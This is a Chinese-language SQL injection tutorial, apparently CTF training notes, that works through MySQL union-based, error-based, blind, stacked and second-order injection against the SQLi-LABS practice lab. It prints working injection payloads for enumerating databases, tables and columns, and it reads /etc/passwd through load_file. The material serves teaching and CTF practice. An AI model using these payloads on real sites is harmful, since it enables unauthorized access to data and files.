# SQL注入基础

## 数据库概述
数据库是结构化信息或数据的有组织的集合，通常由数据库管理系统（DBMS）来控制。

- SQL（**S**tructured **Q**uery **L**anguage，结构化查询语言）是一种特定目的程式语言，用于管理关系数据库管理系统
- **关系型数据库** - Oracle、MSSQL、**MySQL**、PostgreSQL、IBM DB2、Access等
- **非关系型数据库（NoSQL数据库）** - **MongoDB**、Redis、Memcached等
  - NoSQL的本意是“Not Only SQL”，是传统关系型数据库的一个有效补充

## MySQL语法
关键词、函数、特性

- ORDER BY - 排序，超过字段数时报错。用于`确定字段数`
- UNION SELECT - 联合查询，前后两次查询，字段数相同
- LIMIT N,M - 从第N条记录开始，返回M条记录  `LIMIT M OFFSET N` `N`默认为`0`
- GROUP BY - 根据一个或多个列对结果集进行分组，可结合一些聚合函数来使用
- WHERE - 条件语句 `AND` `OR`
- 隐式类型转换 - 数字、字符串、HEX()、ASCII()
- MySQL 5.0版本以上，自带数据库`information_schema`包含数据库结构信息
- 表名和字段名可以通过反引号`\``使用关键字

|   |   |
|---|---|
| user() | 当前数据库用户 |
| database() | 当前数据库名 | 
| version() | 数据库版本 |
| CONCAT()、CONCAT_WS()、**GROUP_CONCAT()** |字符串拼接|

### 注释语法

- 行间注释
  - `-- `  注意后面有空格
  - `#`
- 行内注释
  - `/*注释内容*/`
  - `/*! 注释内容*/`

### 文件操作

MySQL支持读写文件，但与配置有关

```sql
# `空`无限制、指定目录、`NULL`禁止
SHOW VARIABLES LIKE "secure_file_priv";
```

- 文件的位置必须在服务器上，必须知道绝对路径，有`file`权限
- 文件可读取，文件大小小于`max_allow_packet`字节
- 如不满足条件，返回`NULL`


```sql
SELECT * from `tbl` into outfile '/tmp/test.txt';
SELECT load_file('/etc/passwd');
```

## SQL注入概述

SQL注入是注入攻击的一种，攻击者可以执行恶意SQL语句。利用SQL注入漏洞，攻击者可以检索、添加、修改和删除数据库中的记录，甚至可以获取数据库服务器权限。

两个条件
- 用户能够控制输入
- 程序可以执行**拼接**了用户输入的SQL语句

危害
- 绕过登录验证 - 使用万能密码登录网站后台等
- 获取敏感数据 - 获取网站管理员账号、密码等
- 文件系统操作 - 列目录，读取、写入文件等
- 执行命令 - 远程执行系统命令、数据库命令

SQL注入示意图

![](https://book.dropsec.xyz/assets/img/sql-injection.svg)


## SQL注入类型

![](/SQL注入类型.png)

## 联合查询注入（UNION query-based）


以SQLi-LABS Less-1为例

```sql
SELECT * FROM users WHERE id='$id' LIMIT 0,1;
```

1. 判断是否存在注入点 - 
尝试添加单引号`id=1'`，提示语法错误，说明可能存在注入漏洞。

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
```

产生语法错误的原因，SQL语句多了单引号，无法正确闭合。

```sql
SELECT * FROM users WHERE id='1'' LIMIT 0,1;
```

2. 确定字段数
使用`ORDER BY`，二分法，得字段数为3。
```
id=1' order by 4%23 //报错
id=1' order by 2%23，//正常
id=1' order by 3%23 //正常
```

1. 判断显示位
```
?id=-1' UNION SELECT 1,2,3%23
```
1. 获取数据（数据库名、表名、字段名）

数据库
```
?id=-1' union select 1,group_concat(schema_name),3+from+information_schema.schemata%23
```
表名
```
?id=-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema= database()%23
```
字段名
```
?id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema=database() AND table_name='users'%23
```

## 报错注入（error-based）

存在注入，且有错误信息显示，通过人为制造错误条件，使得结果出现在错误信息中

> `~`按位取反
- 数据溢出
  - EXP(_number_) 返回e的x次方
  - `!(select*from(select user())X)-~0`
- XPATH语法错误
  - ExtractValue(_xml_frag_, _xpath_expr_) 查询
  - UpdateXML(_xml_target_, _xpath_expr_, _new_xml_) 修改
  
- 主键重复，count()和group by在遇到rand()产生的重复值

```sql
select count(*) from information_schema.schemata group by concat((select user()),floor(rand(0)*2));
```

表中需要至少3条数据才能报错

## 盲注

存在注入，但没有回显和错误信息。盲注根据判断指标，分为`基于布尔的盲注`和`基于时间的盲注`。

- `SUBSTR(_string_, _start_, _lenth_)` - 字符串截取
- `ASCII(_character_)` - 返回字符的ASCII值

- `LENGTH(_string_)` - 返回字符串长度
- `if(条件,成立,不成立)` 
- `SELECT IF(500<1000, "YES", "NO");`

### 基于布尔的盲注（boolean-based blind）

根据页面返回内容不同进行判断

```
?id=1' and 1=1#		页面返回正常
?id=1' and 1=2#		页面返回不正常
```

- 异或`^`(XOR) - 1^1=0 0^0=0 

0^1=1 1^1^1=0 1^1^0=0   同为0，异为1

```
?id=1^(1=1)^1
?id=1^(ascii(mid(database(),1,1))=98)^1
```

### 基于时间的盲注（time-based blind）

根据页面响应时间判断

`if(ascii(substr(database(),1,1))>100,sleep(1),2=1)`

- `SLEEP(_n_)` - 睡眠n秒
- `BENCHMARK(_count_,_expr_)` - 计算`expr`表达式`count`次，用于测试函数或者表达式的执行速度，返回值都是0，仅仅会执行显示时间
- `笛卡尔积` - 多表查询

```sql
SELECT count(*) FROM information_schema.columns A, information_schema.columns B
```
- `RLIKE` - 利用SQL多次计算正则消耗计算资源产生延时效果，通过`rpad`或`repeat`构造长字符串

```sql
SELECT RPAD('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```

## 堆叠注入（Stacked Queries）

一次执行多条SQL语句，每条语句以`;`结尾。比如后端使用`mysqli_multi_query`函数。由于可以执行其他语句，堆叠注入的危害性更大。

```sql
# 列出数据库
SHOW {DATABASES | SCHEMAS};

# 列出表
SHOW TABLES;

# 查看表结构
SHOW COLUMNS from `tbl_name`;
DESC `tbl_name`;
DESCRIBE `tbl_name`;
```

## 二次（阶）注入（Double Order SQLi）

二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入

- [addslashes](https://www.php.net/manual/zh/function.addslashes.php)，仅仅是为了获取插入数据库的数据，**额外的`\`并不会插入**

例：SQLi-labs 第24关

## 经典赛题分析
## 练习题

简单
- [极客大挑战 2019]EasySQL
- Your secrets

中等
- [极客大挑战 2019]FinalSQL
- [SUCTF 2019]EasySQL

困难
- 网鼎杯 2018 comment